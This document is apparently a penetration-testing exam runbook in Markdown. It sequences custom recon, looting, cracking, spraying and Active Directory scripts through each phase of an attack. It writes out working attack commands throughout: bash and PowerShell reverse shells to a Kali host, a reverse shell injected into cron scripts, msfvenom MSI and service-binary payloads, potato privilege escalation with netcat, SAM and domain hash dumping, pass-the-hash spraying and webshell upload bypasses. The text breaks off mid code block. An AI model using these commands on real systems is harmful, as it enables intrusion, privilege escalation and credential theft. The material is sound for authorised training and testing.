---
tags:
  - type/methodology
  - type/toolkit
  - type/strategy
  - phase/all
---

# OffSec Toolkit Master Strategy Guide

> [!important] This Is Your engagement Runbook
> You have 13 scripts. This document tells you exactly when to fire each one, in what order, what to do with the output, and what to do when something comes back empty. Under engagement pressure, follow this — don't improvise the sequence.

---

## Environment Setup

All Kali-side scripts write output under `$TOOLKIT_ROOT` (defaults to `~/toolkit`). Set it once:

```bash
export TOOLKIT_ROOT="$HOME/toolkit"
```

Unified credential log: `$TOOLKIT_ROOT/creds.txt` — populated automatically by adr.sh, crackr.sh, sprayr.sh.

**Before engagement day**, verify your tools are installed:
```bash
./tools_setup.sh --check    # no sudo needed, just verifies
```

**Quick reference** if you blank on syntax under pressure:
```bash
./workflow.sh              # full cheatsheet
./workflow.sh recon        # just one phase
```

---

## The 13 Scripts at a Glance

| Script | Role | Phase | Runs On |
|--------|------|-------|---------|
| `recon.sh` | Port scan + service enum + quick-wins triage | Recon | Kali |
| `webenum.sh` | Deep web enum | Recon | Kali |
| `escalatr.sh` | Privesc tooling + staging | Post-exploit | Kali |
| `lootr.sh` | Linux loot collection | Post-exploit | **Target** |
| `lootr.ps1` | Windows loot collection | Post-exploit | **Target** |
| `crackr.sh` | Hash cracking + brute force | Passwords | Kali |
| `sprayr.sh` | Credential validation/spray + re-spray | Lateral movement | Kali |
| `adr.sh` | AD enumeration + interactive kill chain | AD | Kali |
| `pivotr.sh` | Pivot setup + reference + reconnect | Pivoting | Kali |
| `servr.sh` | File server (HTTP/SMB/FTP) | File transfer | Kali |
| `evidencr.sh` | Evidence capture | Reporting | Kali |
| `tools_setup.sh` | Tool staging installer + preflight check | Setup | Kali |
| `workflow.sh` | Workflow quick-reference cheatsheet | Reference | Kali |

> [!note] All scripts run on Kali except `lootr.sh` (Linux target) and `lootr.ps1` (Windows target).

---

## engagement Day Master Sequence

### T+0 to T+5 min: Triage ALL targets first

```bash
sudo ./recon.sh --quick-wins-only --auto IP1 IP2 IP3 AD_IP1 AD_IP2 AD_IP3
```

**Step 1 — Read the priority ranking:**
```bash
cat $TOOLKIT_ROOT/recon/target_priority.txt
```

**Step 2 — Decision:**
- **Ranking produced?** → Start with the highest-score target. That's your #1.
- **Ranking empty / all scores tied?** → Start with the AD set if you have assumed-breach creds. Otherwise pick the target with the most open ports from the quick-wins output.

### T+5 min onward: Full recon on all targets

```bash
# Terminal 1: full recon on your #1 target
sudo ./recon.sh --auto IP1

# Terminal 2: full recon on everything else (runs in background while you work #1)
sudo ./recon.sh --auto IP2 IP3 AD_IP1 AD_IP2 AD_IP3
```

Now proceed to Phase 1 below for your #1 target. As scans finish for other targets, repeat Phase 1 for each.

---

## Phase 1: Recon — `recon.sh`

**When:** First thing. Every target. No exceptions.

### Step 1 — Read quick wins first

```bash
cat $TOOLKIT_ROOT/recon/IP/loot/quick_wins.txt
```

**Decision:**
- **File has entries?** → These are instant-action items. Handle each one NOW before reading anything else:
  - `ANONYMOUS FTP LOGIN` → Open a second terminal, log in with `ftp IP`, browse everything, download interesting files (`get filename`). Look for config files, credentials, backups.
  - `SMB READ` or `SMB WRITE` share → `smbclient //IP/sharename -N` (anon) or with creds. Download everything: `mget *`. Grep for passwords: `grep -ri pass .`
  - `MySQL EMPTY PASSWORD` or `MySQL ROOT NO-PASSWORD` → `mysql -h IP -u root` → look for creds in databases.
  - `REDIS NO-AUTH` → `redis-cli -h IP` → `CONFIG GET *`, `KEYS *`, check for webshell write paths.
  - `NFS EXPORTS` → `showmount -e IP` then `mount -t nfs IP:/share /mnt/nfs`. Look for SSH keys, configs, writable dirs.
  - `SNMP` community string hit → check `running_processes.txt` immediately (Step 2 below).
  - `VHOSTS found` → add them to `/etc/hosts` now, then run `webenum.sh --vhost` (Phase 1b below).
- **File is empty or doesn't exist?** → No quick wins. Continue to Step 2.

### Step 2 — Read the full summary

```bash
cat $TOOLKIT_ROOT/recon/IP/summary.txt
```

Note which services are open. This determines your next moves.

### Step 3 — Check high-value secondary files

```bash
# SMB findings (shares, signing, null sessions)
cat $TOOLKIT_ROOT/recon/IP/tcp/smb/smb_quick_findings.txt

# SNMP running processes — passwords frequently appear in service command-line args
cat $TOOLKIT_ROOT/recon/IP/udp/snmp/running_processes.txt
```

**Decision on SMB:**
- **READ/WRITE shares listed?** → Already handled above in quick wins. If you missed it, go do it now.
- **Signing disabled?** → Note this — you'll need it for relay attacks later if you get AD creds.
- **Null session worked?** → Run `enum4linux-ng -A IP` manually for deeper user/group enum.
- **No SMB at all?** → Move on.

**Decision on SNMP:**
- **`running_processes.txt` has entries?** → Read every line. Look for `-p`, `-pass`, `--password`, credentials in command-line arguments. Services like web apps, databases, and scheduled tasks frequently leak creds this way.
- **Found a password in a process arg?** → Try it immediately: `./sprayr.sh -u <guessed_user> -p '<password>' -t IP --quick`
- **File is empty or doesn't exist?** → SNMP wasn't open or community strings didn't hit. Move on.

### Step 4 — Route to next phase based on findings

| Finding | Next Action |
|---------|-------------|
| HTTP/HTTPS open (80, 443, 8080, 8443, any) | → Phase 1b: `webenum.sh` |
| SMB with readable shares | → Already looting them. Grep for creds, configs, scripts. |
| LDAP open (389) | → You likely have AD. If you have creds → Phase 8: `adr.sh` |
| FTP anonymous | → Already browsing. Check for writable dirs (upload a webshell if HTTP also open). |
| SNMP creds found | → `./sprayr.sh` to validate, then escalate. |
| SSH only, no creds | → Park this target. Come back after you crack creds from another box. |
| Nothing actionable | → Go to "Stuck" block below. |

**Stuck — nothing from recon:**
1. Re-run with smaller batch size (network congestion can cause missed ports):
   ```bash
   sudo ./recon.sh --auto --batch-size 500 IP
   ```
2. Run full UDP scan (slow but sometimes reveals SNMP/TFTP/other services missed by top-200):
   ```bash
   sudo ./recon.sh --auto --udp-full IP
   ```
3. Still nothing? → Move to a different target. Come back after 1-2 hours with fresh eyes. Check `Stuck_Decision_Tree.md`.

---

## Phase 1b: Web Enumeration — `webenum.sh`

**When:** `recon.sh` found any HTTP/HTTPS service.

### Step 1 — Run standard web enum

```bash
# Auto-detect HTTP URLs from recon output (easiest)
./webenum.sh --from-recon IP

# Or specify URL directly if auto-detect misses a port
./webenum.sh --url http://IP:8080
```

### Step 2 — Read output in this order

The output directory format is `$TOOLKIT_ROOT/web/<host>_<port>_<proto>/artifacts/web/`. Example: `$TOOLKIT_ROOT/web/10.10.10.5_80_http/artifacts/web/`.

```bash
WEBDIR="$TOOLKIT_ROOT/web/<host>_<port>_<proto>/artifacts/web"

# 1. Summary first — what was found
cat $WEBDIR/summary/summary.md

# 2. Quick wins — exposed files, default creds, juicy paths
cat $WEBDIR/summary/quick_wins.txt

# 3. Sensitive paths — backup files, config files, hidden pages
cat $WEBDIR/fingerprint/sensitive_paths.txt

# 4. Vhost entries — new hostnames to add to /etc/hosts
cat $WEBDIR/vhosts/hosts_entries.txt
```

### Step 3 — Act on what you find

**Decision on `summary.md` / `quick_wins.txt`:**

- **CMS identified (WordPress, Joomla, Drupal, etc.)?**
  - → `searchsploit wordpress X.Y.Z` (use the exact version).
  - → WordPress specifically? `wpscan --url http://IP --enumerate u,vp,vt` for users and vulnerable plugins/themes.
  - → Found a known RCE? → Exploit for foothold → Phase 2.

- **Login page found?**
  - → Try default creds first: `admin:admin`, `admin:password`, `admin:<blank>`, `root:root`.
  - → Check if the app name is identifiable → Google `<app> default credentials`.
  - → None work? → Flag for brute force after you've tried other targets.

- **`.git` directory exposed?**
  - → `git-dumper http://IP/.git ./git-dump` → `cd git-dump` → `git log --oneline` → `git diff HEAD~5` → look for creds, API keys, config changes in commit history.

- **`.env` file found?**
  - → `curl http://IP/.env` → usually contains DB passwords, API keys, app secrets. Try those creds everywhere.

- **`401/403` on `/admin`, `/console`, `/manager`, etc.?**
  - → Flag for auth bypass: try HTTP verb tampering (`curl -X POST`), path traversal (`/admin../`, `//admin`), header injection (`X-Forwarded-For: 127.0.0.1`).
  - → Try default creds for the specific app (e.g., Tomcat `/manager` → `tomcat:s3cret`).

- **File upload endpoint found?**
  - → Test if it accepts `.php`, `.aspx`, `.jsp` — upload a webshell. If filtered, try extension bypass (`.php5`, `.phtml`, `.aspx;.jpg`).

- **Nothing interesting in quick_wins?** → Continue to Step 4.

**Decision on `hosts_entries.txt`:**

- **New vhosts found?**
  - → Add ALL of them to `/etc/hosts`:
    ```bash
    echo "IP  target.htb" | sudo tee -a /etc/hosts
    echo "IP  dev.target.htb" | sudo tee -a /etc/hosts
    ```
  - → Re-run webenum for each new vhost:
    ```bash
    ./webenum.sh --url http://IP --vhost target.htb
    ```
  - → Repeat Steps 2-3 for each vhost's output. Different vhosts frequently serve different apps.

- **No vhosts found?** → Check for domain names in: page source (`curl -s http://IP | grep -i 'href\|src\|domain'`), SSL cert (`openssl s_client -connect IP:443 2>/dev/null | openssl x509 -noout -text | grep -i 'DNS:'`), redirect headers (`curl -Iv http://IP`).
  - → Found a domain? → Add to `/etc/hosts`, run `./webenum.sh --url http://IP --vhost DOMAIN`.
  - → Still nothing? → Continue to Step 4.

### Step 4 — Deep mode if standard came up empty

```bash
./webenum.sh --url http://IP --deep
./webenum.sh --url http://IP --deep --vhost target.htb   # if you have a vhost
```

Deep mode enables recursive fuzzing and parameter discovery. Re-read `summary.md` and `quick_wins.txt` after it finishes — repeat Step 3.

### Step 5 — Still nothing after deep mode

- Try different wordlists manually with `ffuf` or `gobuster`:
  ```bash
  ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc all -fc 404
  ```
- Try different extensions based on the tech stack (`.php` for Apache, `.aspx` for IIS, `.jsp` for Tomcat).
- Check for API endpoints: `/api/`, `/v1/`, `/graphql`, `/swagger`, `/docs`.
- Move to a different target if you've spent >30 min on web enum with no foothold vector.

---

## Phase 2: Foothold — Get a Stable Shell

This is manual. Your cheatsheets (`Web_App.md`, `Active_Directory.md`, `Reverse_Shells.md`) drive exploitation.

### Step 1 — Start your listener BEFORE launching the exploit

```bash
penelope -p 4444 -O     # -O = auto-upgrade to PTY
```

### Step 2 — Launch the exploit

Use whatever attack vector you found in Phase 1/1b. If it's a reverse shell payload, make sure the callback IP and port match your Penelope listener.

### Step 3 — Shell lands. Confirm context immediately

```bash
whoami && hostname && id && ip a
```

**Decision:**
- **Root/SYSTEM already?** → Skip to Phase 10: `evidencr.sh`. Capture flags NOW.
- **Low-priv user?** → Continue to Step 4.
- **Shell dies or is unstable?** → Re-exploit. Consider a different payload type. If the shell is a webshell or very limited, upgrade:
  ```bash
  # On target — bash reverse shell
  bash -i >& /dev/tcp/KALI_IP/4444 0>&1
  # Or PowerShell
  powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('KALI_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($o)),0,$o.Length)}"
  ```

### Step 4 — Note the OS

- **Linux?** → Phase 3 uses `lootr.sh`
- **Windows?** → Phase 3 uses `lootr.ps1`

### Step 5 — Screenshot NOW (before you do anything else)

Capture `whoami`, `hostname`, `id` (or `whoami /priv` on Windows) in the same terminal frame. You need this for the report and you WILL forget later.

---

## Phase 3: Post-Exploitation — First 2 Minutes After Shell

### Linux Target: `lootr.sh`

**Step 1 — Serve `lootr.sh` from Kali:**
```bash
./servr.sh http --port 8080
```

**Step 2 — Transfer and run on target:**
```bash
wget http://KALI_IP:8080/lootr.sh -O /tmp/lootr.sh
chmod +x /tmp/lootr.sh
bash /tmp/lootr.sh
```

> [!tip] If `wget` fails, try `curl -o /tmp/lootr.sh http://KALI_IP:8080/lootr.sh`. If both fail, the target may have no outbound HTTP — try base64 encoding the script and pasting it, or use a different transfer method (see Phase 4).

**Step 3 — Read output and act on each finding:**

```bash
HOST=$(hostname)
```

**3a — Summary first:**
```bash
cat ~/loot/$HOST/summary.txt
```
Read the whole thing. It flags the highest-value findings. Continue below to investigate each category.

**3b — Sudo rights:**
```bash
cat ~/loot/$HOST/system/sudo_rights.txt
```
- **`NOPASSWD` entries found?** → Check each binary against GTFOBins (`https://gtfobins.github.io/`).
  - Binary is on GTFOBins with a sudo exploit? → Run it. You're root. → Phase 10: `evidencr.sh`.
  - Binary is NOT on GTFOBins? → Can you abuse it to read/write files? (e.g., `sudo tee`, `sudo cp`, `sudo vi`). If it can write, overwrite `/etc/passwd` with a new root entry.
- **No `NOPASSWD` entries?** → Continue to 3c.
- **`sudo: command not found`?** → sudo isn't installed. Skip, continue to 3c.

**3c — SUID binaries:**
```bash
cat ~/loot/$HOST/files/suid_binaries.txt
```
- **Custom or unusual SUID binaries found?** (anything NOT standard like `su`, `mount`, `ping`, `passwd`) → Check GTFOBins for each one.
  - Exploitable? → Run the GTFOBins SUID exploit → root → Phase 10.
  - Not on GTFOBins? → Check if it's a custom binary: `strings /path/to/binary | grep -i pass\|exec\|system\|/bin`. Custom SUID binaries sometimes call other programs without full paths (PATH injection) or have buffer overflows.
- **Only standard SUID binaries?** → Continue to 3d.

**3d — Cron jobs:**
```bash
cat ~/loot/$HOST/files/cron_jobs.txt
```
- **Writable cron script found?** → Inject a reverse shell:
  ```bash
  echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /path/to/writable_script.sh
  ```
  Start Penelope listener, wait for cron execution (check the schedule — could be 1-5 min).
- **Cron script calls a binary using a relative path?** → PATH hijack: create your own version earlier in PATH.
- **Wildcard in cron command (e.g., `tar *`)?** → Wildcard injection — research the specific command.
- **No writable crons?** → Continue to 3e.

**3e — Hashes and keys:**
```bash
cat ~/loot/$HOST/creds/shadow_hashes.txt
ls ~/loot/$HOST/creds/key_*
```
- **Shadow hashes found?** → Crack immediately on Kali:
  ```bash
  ./crackr.sh --unshadow /tmp/passwd /tmp/shadow -q
  ```
  Transfer `/etc/passwd` and `/etc/shadow` to Kali first if not already there.
  - **Cracked a password?** → Try `su <user>`. If that user has sudo rights, check GTFOBins again for their allowed commands. → Also run `./sprayr.sh --from-creds` to spray it against all other targets.
  - **Nothing cracked in quick mode?** → Escalate cracking (see Phase 6, Step 4).

- **SSH private key found?** → Try it directly first — don't waste time cracking if it's unencrypted:
  ```bash
  chmod 600 ~/loot/$HOST/creds/key_*
  ssh -i ~/loot/$HOST/creds/key_rsa root@localhost   # try root first
  ssh -i ~/loot/$HOST/creds/key_rsa user@localhost    # try the owner
  ```
  - **Passphrase required?** → Crack it:
    ```bash
    ./crackr.sh -e ssh -f key_file -q
    ```
  - **Key accepted without passphrase?** → You're in as that user. Check their sudo rights.

- **No hashes, no keys?** → Continue to 3f.

**3f — Internal network:**
```bash
cat ~/loot/$HOST/network/internal_listeners.txt
cat ~/loot/$HOST/network/reachable_subnets.txt
```
- **Local-only services found (127.0.0.1:PORT)?** → These are hidden services. Port-forward them back to Kali for investigation:
  ```bash
  # If you have SSH access
  ssh -L 8888:127.0.0.1:PORT user@target
  # Then browse http://127.0.0.1:8888 from Kali
  ```
  Often these are internal web apps, databases, or admin panels with weaker security.

- **New subnets found?** → Note them. After you root this box, you'll use `pivotr.sh` (Phase 9) to reach them.

- **Neither?** → Continue to Phase 5 (escalatr.sh for automated privesc scanning).

**Quick mode** when you need speed or just specific data:
```bash
./lootr.sh --quick       # skips slower process phase
./lootr.sh --phase proof # just find the flags NOW
./lootr.sh --phase creds # just pull credentials
```

---

### Windows Target: `lootr.ps1`

**Step 1 — Serve from Kali via SMB (fastest for Windows):**
```bash
./servr.sh smb --share tools
```

**Step 2 — Transfer and run on target:**
```powershell
copy \\KALI_IP\tools\lootr.ps1 C:\Windows\Temp\
cd C:\Windows\Temp
powershell -ep bypass -File .\lootr.ps1
```

> [!tip] If SMB is blocked, fall back to HTTP: `./servr.sh http --port 8080` on Kali, then `certutil -urlcache -f http://KALI_IP:8080/lootr.ps1 C:\Windows\Temp\lootr.ps1` on target. If certutil is blocked, try `powershell -c "iwr -uri http://KALI_IP:8080/lootr.ps1 -outfile C:\Windows\Temp\lootr.ps1"`.

**Step 3 — Read output and act on each finding:**

```powershell
$H = $env:COMPUTERNAME; $R = ".\loot\$H"
```

**3a — Summary first:**
```powershell
Get-Content "$R\summary.txt"
```

**3b — AlwaysInstallElevated (fastest Windows privesc — check this FIRST):**
```powershell
Get-Content "$R\files\always_install_elevated.txt"
```
- **Both HKLM and HKCU keys = 1?** → Instant SYSTEM. Generate MSI payload and run:
  ```bash
  # On Kali:
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4445 -f msi -o evil.msi
  # Serve it: ./servr.sh smb --share tools
  ```
  ```powershell
  # On target:
  copy \\KALI_IP\tools\evil.msi C:\Windows\Temp\
  msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
  ```
  Catch the shell with `penelope -p 4445 -O` → You're SYSTEM → Phase 10.
- **One or both keys = 0 or missing?** → Not exploitable. Continue to 3c.

**3c — Privileges:**
```powershell
Get-Content "$R\creds\privileges.txt"
```
- **`SeImpersonatePrivilege` enabled?** → Potato attack. Transfer GodPotato or PrintSpoofer:
  ```bash
  # On Kali — serve the binary
  ./servr.sh smb --share tools
  ```
  ```powershell
  # On target (GodPotato):
  copy \\KALI_IP\tools\GodPotato-NET4.exe C:\Windows\Temp\
  C:\Windows\Temp\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe KALI_IP 4445"
  # OR PrintSpoofer:
  copy \\KALI_IP\tools\PrintSpoofer64.exe C:\Windows\Temp\
  C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe -e cmd.exe KALI_IP 4445"
  ```
  Catch with Penelope → SYSTEM → Phase 10.
- **`SeBackupPrivilege` enabled?** → Can copy SAM/SYSTEM hives:
  ```powershell
  reg save HKLM\SAM C:\Windows\Temp\SAM
  reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
  ```
  Transfer to Kali → `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` → crack hashes → spray.
- **No useful privileges?** → Continue to 3d.

**3d — Stored credentials:**
```powershell
Get-Content "$R\creds\autologon.txt"
Get-Content "$R\creds\cmdkey.txt"
```
- **Autologon creds found?** → Plaintext credentials in registry. Spray immediately:
  ```bash
  ./sprayr.sh -u <user> -p '<password>' -t IP --quick
  ```
  If the user is admin on this box → `impacket-psexec` for a SYSTEM shell. If it's a domain user → also try `./sprayr.sh --from-creds` against all targets.

- **Stored credentials in cmdkey?** → Use `runas /savecred`:
  ```powershell
  runas /savecred /user:DOMAIN\admin "C:\Windows\Temp\nc.exe -e cmd.exe KALI_IP 4445"
  ```
  Catch with Penelope → you're running as that stored user.

- **Neither?** → Continue to 3e.

**3e — Service-based privesc:**
```powershell
Get-Content "$R\files\unquoted_service_paths.txt"
```
- **Writable directory in an unquoted service path?** → Drop a malicious binary at the writable location. Name it to match the path parsing (e.g., if path is `C:\Program Files\Vuln App\service.exe`, drop `C:\Program.exe` if `C:\` is writable, or `C:\Program Files\Vuln.exe` if `C:\Program Files\` is writable).
  ```bash
  # On Kali — generate payload
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4445 -f exe -o Vuln.exe
  ```
  Transfer, then restart the service: `sc stop VulnService && sc start VulnService` (or reboot if you can't restart it directly). Catch shell → SYSTEM.

- **No unquoted paths?** → Check for writable service binaries:
  ```powershell
  Get-Content "$R\files\writable_service_binaries.txt" 2>$null
  ```
  If found → replace the binary with your payload, restart the service.

- **Nothing?** → Continue to Phase 5 (escalatr.sh for winPEAS).

**3f — Internal network (same as Linux):**
```powershell
Get-Content "$R\network\internal_listeners.txt"
```
- **Local-only services?** → Port-forward back with chisel or pivotr.
- **New subnets?** → Note for Phase 9 after rooting this box.

> [!warning] Do NOT use `.\lootr.ps1 -Quick` when looking for privesc vectors. Quick mode skips AlwaysInstallElevated, unquoted paths, and DLL hijack checks — the three easiest Windows wins.

**Quick mode** only when you need speed on non-privesc tasks:
```powershell
.\lootr.ps1 -Quick           # skips slower files/privesc phase
.\lootr.ps1 -Phase proof     # just the flags
.\lootr.ps1 -Phase creds     # creds and privileges only
```

---

## Phase 4: File Serving — `servr.sh`

**When:** Any time you need to move files between Kali and target. Start this BEFORE trying to transfer.

### Step 1 — Pick the right mode based on target OS and what's available

**Decision:**
- **Windows target?** → Try SMB first (no download command needed, just `copy`):
  ```bash
  ./servr.sh smb --share tools
  ```
  - **SMB blocked?** → Fall back to HTTP:
    ```bash
    ./servr.sh http --port 8080
    ```
  - **HTTP also blocked?** → Try FTP:
    ```bash
    ./servr.sh ftp --port 2121
    ```

- **Linux target?** → HTTP (wget/curl available on almost every Linux box):
  ```bash
  ./servr.sh http --port 8080
  ```
  - **No wget AND no curl?** → Try `/dev/tcp` for small files:
    ```bash
    cat < /dev/tcp/KALI_IP/8080 > /tmp/tool
    ```
  - **Or use FTP:**
    ```bash
    ./servr.sh ftp --port 2121
    ```

### Step 2 — Use the printed commands

`servr.sh` prints fully resolved copy-paste commands for both Linux and Windows on startup. **Use those exact commands** — don't retype URLs manually. One wrong digit wastes 10 minutes.

### Step 3 — Serving a specific directory

```bash
./servr.sh http --dir ~/tools --port 8080    # serve your tools directory
./servr.sh smb --dir ~/tools --share tools   # SMB version
```

---

## Phase 5: Privilege Escalation — `escalatr.sh`

**When:** Run this FROM KALI alongside lootr (Phase 3). It stages linpeas/winPEAS on a file server and optionally parses the output.

### Step 1 — Run from Kali

```bash
./escalatr.sh TARGET_IP                # auto-detect OS
./escalatr.sh TARGET_IP --os linux     # force Linux
./escalatr.sh TARGET_IP --os windows   # force Windows
```

### Step 2 — Download and run on target

escalatr.sh prints the exact commands. Follow them. General pattern:

**Linux:**
```bash
curl http://KALI_IP:8888/linpeas.sh | bash | tee /tmp/linpeas_output.txt
```

**Windows:**
```powershell
copy \\KALI_IP\tools\winPEASx64.exe C:\Windows\Temp\
C:\Windows\Temp\winPEASx64.exe | Tee-Object C:\Windows\Temp\winpeas_output.txt
```

### Step 3 — Transfer output back to Kali and parse

```bash
./escalatr.sh --parse /tmp/linpeas_output.txt
./escalatr.sh --parse /tmp/winpeas_output.txt --os windows
```

### Step 4 — Read the quick-wins report

```bash
cat $TOOLKIT_ROOT/privesc/TARGET_IP/quick-wins.txt
```

**Decision — act on findings in priority order:**

| Finding | Priority | Action |
|---------|----------|--------|
| Shadow hashes | HIGH | `./crackr.sh --unshadow /tmp/passwd /tmp/shadow -q` → then `su <user>` if cracked |
| SSH private key | HIGH | Try directly first (`ssh -i key user@target`). If passphrase → `./crackr.sh -e ssh -f key -q` |
| `SeImpersonatePrivilege` | HIGH | GodPotato or PrintSpoofer (see Phase 3 Windows 3c above) |
| `sudo -l` NOPASSWD binary | HIGH | GTFOBins → exploit → root |
| `AlwaysInstallElevated` | HIGH | MSI payload → instant SYSTEM (see Phase 3 Windows 3b above) |
| SUID binary on GTFOBins | MEDIUM | Exploit directly for root |
| Writable cron script | MEDIUM | Inject reverse shell, wait for execution |
| Unquoted service path | MEDIUM | Drop binary in writable path, restart service |
| Writable service binary | MEDIUM | Replace binary, restart service |
| Internal-only services (127.0.0.1) | LOW | Port-forward back, investigate |
| Kernel version + known exploit | LAST RESORT | Only try if nothing else works — unreliable and can crash the box |

- **Found a high-priority item?** → Exploit it now. If you get root/SYSTEM → Phase 10: `evidencr.sh` immediately.
- **Nothing in quick-wins.txt?** → Read the full linpeas/winPEAS output manually. Look for things the parser might have missed: config files with passwords, interesting running processes, writable PATH directories, Docker/LXC group membership (Linux), scheduled tasks with writable scripts (Windows).
- **Truly nothing?** → Check `Stuck_Decision_Tree.md`. Consider whether you missed a web vector (Phase 1b) or whether this box requires pivoting from another compromised host.

---

## Phase 6: Password Cracking — `crackr.sh`

**When:** ANY hash surfaces ANYWHERE — shadow file, SAM dump, AS-REP, Kerberoast, NTLMv2 capture, SSH key, zip/archive, web app database.

**Rule: Crack immediately. Spray immediately after cracking. No exceptions.**

### Step 1 — Quick mode first (covers 80-90% of OffSec hashes)

```bash
./crackr.sh -q -f hashes.txt                          # auto-detect hash type
./crackr.sh -q -H '$krb5tgs$23$*...'                  # single Kerberoast hash
./crackr.sh -q -H 'aad3b435b51404ee:NTHASHHERE'       # NTLM hash
./crackr.sh --unshadow /tmp/passwd /tmp/shadow -q      # shadow file from lootr
./crackr.sh -e ssh -f id_rsa -q                        # SSH private key
./crackr.sh -q -f $TOOLKIT_ROOT/ad/DOMAIN/hashes/asreproast.txt   # AS-REP from adr.sh
./crackr.sh -q -f $TOOLKIT_ROOT/ad/DOMAIN/hashes/kerberoast.txt   # Kerberoast from adr.sh
```

### Step 2 — Check results

```bash
./crackr.sh --show -f hashes.txt
cat $TOOLKIT_ROOT/creds.txt                               # all cracked creds auto-logged
```

**Decision:**
- **Password cracked?** → Go to Step 3 immediately.
- **Nothing cracked?** → Go to Step 4 (escalate cracking).

### Step 3 — Spray cracked credential IMMEDIATELY

```bash
./sprayr.sh --from-creds    # sprays every known cred against every known target
```

This is not optional. Every cracked password gets sprayed everywhere, every time. Then go to Phase 7, Step 4 to act on spray results.

### Step 4 — If quick mode fails, escalate cracking

Try these in order — stop as soon as something cracks:

```bash
# 1. Rule-based attack (mutations on rockyou)
./crackr.sh -f hashes.txt -w rockyou -r best64

# 2. Company/target-specific wordlist
./crackr.sh --cewl http://target.htb --cewl-mutate -q -f hashes.txt

# 3. Pattern mask (if you have a hint about password format)
./crackr.sh --mask '?u?l?l?l?d?d?d?d' -m 1000 -f hashes.txt   # e.g., "Word1234"
./crackr.sh --mask 'Company?d?d?d' -m 1000 -f hashes.txt       # e.g., "Company123"

# 4. Larger wordlist
./crackr.sh -f hashes.txt -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

- **Cracked something?** → `./sprayr.sh --from-creds` immediately. Always.
- **Still nothing?** → The password may not be crackable with available wordlists. Move on — come back if you find a password hint later (company name, user info, password policy).

---

## Phase 7: Credential Validation & Spraying — `sprayr.sh`

**When:** You crack a hash, find a plaintext password, or get an NTLM hash from a dump.

**Rule: `./sprayr.sh --from-creds` after EVERY new credential discovery. No exceptions.**

### Step 1 — Re-spray all known creds

```bash
./sprayr.sh --from-creds
```

This sprays every credential in `$TOOLKIT_ROOT/creds.txt` against every target discovered by `recon.sh`. Run it after every crack, every dump, every new cred found anywhere.

### Step 2 — Validate a specific credential (if not yet in creds.txt)

```bash
# Password auth
./sprayr.sh -u administrator -p 'Password123!' -t 192.168.1.10 --quick

# Pass-the-Hash
./sprayr.sh -u administrator -H NTHASH -t 192.168.1.10 --quick

# Spray a hash across a subnet (check for reused local admin password)
./sprayr.sh -u administrator -H NTHASH -t 192.168.1.0/24 --quick
```

### Step 3 — Domain spray (check lockout policy FIRST)

```bash
cat $TOOLKIT_ROOT/ad/DOMAIN/password_policy.txt    # ★ ALWAYS check before domain spraying
```

**Decision:**
- **Lockout threshold > 0?** → Use `--safe` (adds jitter between attempts). Only spray ONE password per cycle. Wait for the lockout window to reset before trying another.
  ```bash
  ./sprayr.sh -U $TOOLKIT_ROOT/ad/DOMAIN/users/all_users.txt -p 'Summer2024!' \
    -d corp.local -t DC_IP --safe
  ```
- **Lockout threshold = 0 (no lockout)?** → You can spray more aggressively, but still use `--safe` to avoid noise.
- **No password policy file yet?** → Run `./adr.sh --quick` first to get it. DO NOT spray domain accounts blind.

### Step 4 — Act on spray results

```bash
cat $TOOLKIT_ROOT/spray/*/next_steps.txt    # auto-generated follow-on commands
```

**Decision based on `next_steps.txt`:**

- **`Pwn3d!` on SMB?** → You have admin on that box. Get a shell:
  ```bash
  impacket-psexec domain/user:pass@IP          # SYSTEM shell
  impacket-wmiexec domain/user:pass@IP         # admin shell (stealthier, no service install)
  ```
  → Then run `lootr.ps1` on that box → Phase 10 for flags → then `impacket-secretsdump` to dump all hashes → `./sprayr.sh --from-creds` again.

- **`Pwn3d!` on WinRM?** → Shell:
  ```bash
  evil-winrm -i IP -u user -p pass
  ```
  → Same flow: lootr → evidencr → secretsdump → respray.

- **Valid creds but no `Pwn3d!`?** → You can authenticate but aren't admin. Still useful:
  - Try `evil-winrm` (WinRM doesn't always require local admin).
  - Use the creds for AD enumeration: `./adr.sh -d domain -u user -p pass -dc DC_IP`.
  - Check if the user has special group memberships (BloodHound).
  - Try RDP: `xfreerdp /u:user /p:pass /v:IP /cert-ignore`.

- **Domain admin hit?** → Dump everything:
  ```bash
  impacket-secretsdump domain/user:pass@DC_IP    # dumps ALL domain hashes
  ./sprayr.sh --from-creds                        # spray the new hashes everywhere
  ```
  → You own the domain. Get shells on the DC and all AD machines → Phase 10 for every flag.

- **No hits at all?** → Creds may only work on a service not covered by the spray (e.g., a web app, database, FTP). Try manually:
  ```bash
  # SSH
  ssh user@IP
  # FTP
  ftp IP  # use the creds at the prompt
  # MySQL
  mysql -h IP -u user -p
  # Web app login
  # Use the creds on any login pages you found in Phase 1b
  ```

---

## Phase 8: Active Directory — `adr.sh`

**When:** You have ANY valid domain credentials — assumed-breach creds, cracked hash, creds found in a config file, whatever.

### Step 1 — Quick sweep first (validates creds + grabs low-hanging fruit)

```bash
./adr.sh -d corp.local -u jdoe -p Pass -dc DC_IP --quick
```

If you have an NTLM hash instead of a password:
```bash
./adr.sh -d corp.local -u jdoe -H :NTHASH -dc DC_IP --quick
```

### Step 2 — Read quick output IMMEDIATELY

**2a — Summary:**
```bash
cat $TOOLKIT_ROOT/ad/corp.local/summary.txt
```

**2b — Suspicious descriptions (check this FIRST — passwords in AD comments = OffSec classic):**
```bash
cat $TOOLKIT_ROOT/ad/corp.local/users/suspicious_descriptions.txt
```
- **Passwords found in descriptions?** → Try them immediately:
  ```bash
